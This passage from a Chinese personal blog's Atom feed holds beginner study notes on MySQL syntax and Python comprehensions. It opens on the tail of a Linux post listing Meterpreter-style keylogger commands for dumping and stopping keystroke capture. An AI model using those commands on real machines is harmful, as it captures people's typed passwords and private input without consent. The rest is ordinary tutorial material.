键盘记录软件的内容转储</div><div class="line">  keyscan_stop 关闭键盘记录</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
      <category term="学习" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>MySQL语法</title>
    <link href="http://yoursite.com/2018/03/23/MySQL%E8%AF%AD%E6%B3%95/"/>
    <id>http://yoursite.com/2018/03/23/MySQL语法/</id>
    <published>2018-03-23T08:13:36.000Z</published>
    <updated>2018-03-23T08:21:27.074Z</updated>
    
    <content type="html"><![CDATA[<hr><p>一些小总结，感觉自己白学了一样<br><a id="more"></a></p><h3 id="MySQL语法小结"><a href="#MySQL语法小结" class="headerlink" title="MySQL语法小结"></a>MySQL语法小结</h3><h4 id="一、名词解释"><a href="#一、名词解释" class="headerlink" title="一、名词解释"></a>一、名词解释</h4><h5 id="1-表、行、列"><a href="#1-表、行、列" class="headerlink" title="1.表、行、列"></a>1.表、行、列</h5><p>表 (table)结构化的文件</p><p>行 称为记录或者表的结构</p><p>列 字段(column)，属性 (名称  长度  数据类型  约束)</p><h4 id="二、SQL操作"><a href="#二、SQL操作" class="headerlink" title="二、SQL操作"></a>二、SQL操作</h4><h5 id="1-常用数据库操作"><a href="#1-常用数据库操作" class="headerlink" title="1.常用数据库操作"></a>1.常用数据库操作</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">创建一个数据库 create database xxx;</div><div class="line">选择一个数据库 use xxx;</div><div class="line">导入数据库 source D:\xxx.sql;</div><div class="line">删除数据库 drop database xxx;</div></pre></td></tr></table></figure><h5 id="2-查看表结构"><a href="#2-查看表结构" class="headerlink" title="2.查看表结构"></a>2.查看表结构</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">mysql&gt; desc user;</div><div class="line">+------------------------+-----------------------------------+------+-----+---------+-------+</div><div class="line">| Field                  | Type                              | Null | Key | Default | Extra |</div><div class="line">+------------------------+-----------------------------------+------+-----+---------+-------+</div><div class="line">| Host                   | char(60)                          | NO   | PRI |         |       |</div><div class="line">| User                   | char(16)                          | NO   | PRI |         |       |</div><div class="line">| Password               | char(41)                          | NO   |     |         |       |</div><div class="line">| Select_priv            | enum(&apos;N&apos;,&apos;Y&apos;)                     | NO   |     | N       |       |</div><div class="line">| Insert_priv            | enum(&apos;N&apos;,&apos;Y&apos;)                     | NO   |     | N       |       |</div><div class="line">| Update_priv            | enum(&apos;N&apos;,&apos;Y&apos;)                     | NO   |     | N       |       |</div><div class="line">| Delete_priv            | enum(&apos;N&apos;,&apos;Y&apos;)                     | NO   |     | N       |       |</div><div class="line">| Create_priv            | enum(&apos;N&apos;,&apos;Y&apos;)                     | NO   |     | N       |       |</div><div class="line">| Drop_priv              | enum(&apos;N&apos;,&apos;Y&apos;)                     | NO   |     | N       |       |</div><div class="line">| Reload_priv            | enum(&apos;N&apos;,&apos;Y&apos;)                     | NO   |     | N       |       |</div><div class="line">| Shutdown_priv          | enum(&apos;N&apos;,&apos;Y&apos;)                     | NO   |     | N       |       |</div><div class="line">| Process_priv           | enum(&apos;N&apos;,&apos;Y&apos;)                     | NO   |     | N       |       |</div><div class="line">| File_priv              | enum(&apos;N&apos;,&apos;Y&apos;)                     | NO   |     | N       |       |</div><div class="line">| Grant_priv             | enum(&apos;N&apos;,&apos;Y&apos;)                     | NO   |     | N       |       |</div><div class="line">| References_priv        | enum(&apos;N&apos;,&apos;Y&apos;)                     | NO   |     | N       |       |</div><div class="line">| Index_priv             | enum(&apos;N&apos;,&apos;Y&apos;)                     | NO   |     | N       |       |</div><div class="line">| Alter_priv             | enum(&apos;N&apos;,&apos;Y&apos;)                     | NO   |     | N       |       |</div></pre></td></tr></table></figure><h5 id="3-查看MySQL版本"><a href="#3-查看MySQL版本" class="headerlink" title="3.查看MySQL版本"></a>3.查看MySQL版本</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select version();</div><div class="line">+-----------+</div><div class="line">| version() |</div><div class="line">+-----------+</div><div class="line">| 5.5.53    |</div><div class="line">+-----------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure><h5 id="4-查看当前数据库"><a href="#4-查看当前数据库" class="headerlink" title="4.查看当前数据库"></a>4.查看当前数据库</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select database();</div><div class="line">+------------+</div><div class="line">| database() |</div><div class="line">+------------+</div><div class="line">| mysql      |</div><div class="line">+------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure><p>5.查看表的创建语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">mysql&gt; show create table user;</div><div class="line">+-------+-------------------------------------------------------------------------------------------------------------------------------+</div><div class="line">| Table | Create Table                                                                             </div><div class="line">+-------+--------------------------------------------------+</div><div class="line">| user  | CREATE TABLE `user` (</div><div class="line">  `Host` char(60) COLLATE utf8_bin NOT NULL DEFAULT &apos;&apos;,</div><div class="line">  `User` char(16) COLLATE utf8_bin NOT NULL DEFAULT &apos;&apos;,</div><div class="line">  `Password` char(41) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT &apos;&apos;,</div><div class="line">  `Select_priv` enum(&apos;N&apos;,&apos;Y&apos;) CHARACTER SET utf8 NOT NULL DEFAULT &apos;N&apos;,</div><div class="line">  `Insert_priv` enum(&apos;N&apos;,&apos;Y&apos;) CHARACTER SET utf8 NOT NULL DEFAULT &apos;N&apos;,</div><div class="line">  `Update_priv` enum(&apos;N&apos;,&apos;Y&apos;) CHARACTER SET utf8 NOT NULL DEFAULT &apos;N&apos;,</div><div class="line">  `Delete_priv` enum(&apos;N&apos;,&apos;Y&apos;) CHARACTER SET utf8 NOT NULL DEFAULT &apos;N&apos;,</div><div class="line">  `Create_priv` enum(&apos;N&apos;,&apos;Y&apos;) CHARACTER SET utf8 NOT NULL DEFAULT &apos;N&apos;,</div><div class="line">  `Drop_priv` enum(&apos;N&apos;,&apos;Y&apos;) CHARACTER SET utf8 NOT NULL DEFAULT &apos;N&apos;,</div><div class="line">  `Reload_priv` enum(&apos;N&apos;,&apos;Y&apos;) CHARACTER SET utf8 NOT NULL DEFAULT &apos;N&apos;,</div><div class="line">  `Shutdown_priv` enum(&apos;N&apos;,&apos;Y&apos;) CHARACTER SET utf8 NOT NULL DEFAULT &apos;N&apos;,</div></pre></td></tr></table></figure><h4 id="三、一些补充"><a href="#三、一些补充" class="headerlink" title="三、一些补充"></a>三、一些补充</h4><p>查询顺序  先from 再 where 最后 select</p><p>&lt;&gt;相当于!=</p><p>select id from user where id&gt;=3000 and id<5000; <=""> select id from user between 3000 and 5000;</5000;></p><p>判断null用 is null</p><p>判断不为null 用 is not null</p><p>and优先级高于or</p><p>%代表0~N个任一字符，_代表一个任一字符</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
&lt;p&gt;一些小总结，感觉自己白学了一样&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="MYSQL" scheme="http://yoursite.com/categories/MYSQL/"/>
    
    
      <category term="学习" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>Python编程</title>
    <link href="http://yoursite.com/2018/03/21/python%E7%BC%96%E7%A8%8B/"/>
    <id>http://yoursite.com/2018/03/21/python编程/</id>
    <published>2018-03-21T15:23:27.000Z</published>
    <updated>2018-08-30T07:12:08.509Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h4 id="python小代码"><a href="#python小代码" class="headerlink" title="python小代码"></a>python小代码</h4><h5 id="1-过滤列表中的负数-使用列表解析"><a href="#1-过滤列表中的负数-使用列表解析" class="headerlink" title="1.过滤列表中的负数(使用列表解析)"></a>1.过滤列表中的负数(使用列表解析)</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</div><div class="line"></div><div class="line">data = [randint(<span class="number">-10</span>,<span class="number">10</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">10</span>)]</div><div class="line">print(data,end=<span class="string">' '</span>)</div><div class="line"></div><div class="line">filter(<span class="keyword">lambda</span> x: x&gt;=<span class="number">0</span>,data)  <span class="comment">#使用filter，时间长不推荐</span></div><div class="line"></div><div class="line">b = [x <span class="keyword">for</span> x <span class="keyword">in</span> data <span class="keyword">if</span> x&gt;=<span class="number">0</span>]  <span class="comment">#使用列表解析</span></div><div class="line">print(b)</div></pre></td></tr></table></figure><h5 id="2-筛选字典高于90的项-使用字典解析"><a href="#2-筛选字典高于90的项-使用字典解析" class="headerlink" title="2.筛选字典高于90的项(使用字典解析)"></a>2.筛选字典高于90的项(使用字典解析)</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</div><div class="line"></div><div class="line">d = &#123;x : randint(<span class="number">60</span>,<span class="number">100</span>) <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">21</span>)&#125;</div><div class="line">b = &#123;k : v <span class="keyword">for</span> k,v <span class="keyword">in</span> d.items() <span class="keyword">if</span> v &gt;<span class="number">90</span>&#125;</div><div class="line">print(b)</div></pre></td></tr></table></figure><h5 id="3-集合解析"><a href="#3-集合解析" class="headerlink" title="3.集合解析"></a>3.集合解析</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">from random import randint</div><div class="line"></div><div class="line">data = [randint(-10,10) for _ in range(10)]</div><div class="line">s = set(data)</div><div class="line">c = &#123;x for x in s if x % 3 == 0 &#125;</div><div class="line">print(c)</div></pre></td></tr></table></figure><h5 id="4-使用namedtuple为每个元组的值命名"><a href="#4-使用namedtuple为每个元组的值命名" class="headerlink" title="4.使用namedtuple为每个元组的值命名"></a>4.使用namedtuple为每个元组的值命名</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</div><div class="line"></div><div class="line">stu = namedtuple(<span class="string">'stu'</span>,[<span class="string">'name'</span>,<span class="string">'age'</span>,<span class="string">'sex'</span>,<span class="string">'email'</span>])</div><div class="line">s = stu(<span class="string">'jim'</span>,<span class="number">16</span>,<span class="string">'male'</span>,<span class="string">'1@qq.com'</span>)</div><div class="line">print(s.name)</div></pre></td></tr></table></figure><h5 id="二-统计元素出现的频度"><a href="#二-统计元素出现的频度" class="headerlink" title="二 统计元素出现的频度"></a>二 统计元素出现的频度</h5><h6 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</div><div class="line"></div><div class="line">data = [randint(<span class="number">0</span>,<span class="number">20</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">30</span>)]</div><div class="line"></div><div class="line">c = dict.fromkeys(data,<span class="number">0</span>)</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> data:</div><div class="line">    c[x] += <span class="number">1</span></div><div class="line">print(c)</div></pre></td></tr></table></figure><h6 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</div><div class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</div><div class="line"></div><div class="line">data = [randint(<span class="number">0</span>,<span class="number">20</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">30</span>)]</div><div class="line">c2 = Counter(data)</div><div class="line">print(c2)</div><div class="line"><span class="comment">#出现最高的3个字母</span></div><div class="line">c3 = c2.most_common(<span class="number">3</span>)</div><div class="line">print(c3)</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Python3" scheme="http://yoursite.com/categories/Python3/"/>
    
    
      <category term="学习" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
</feed>
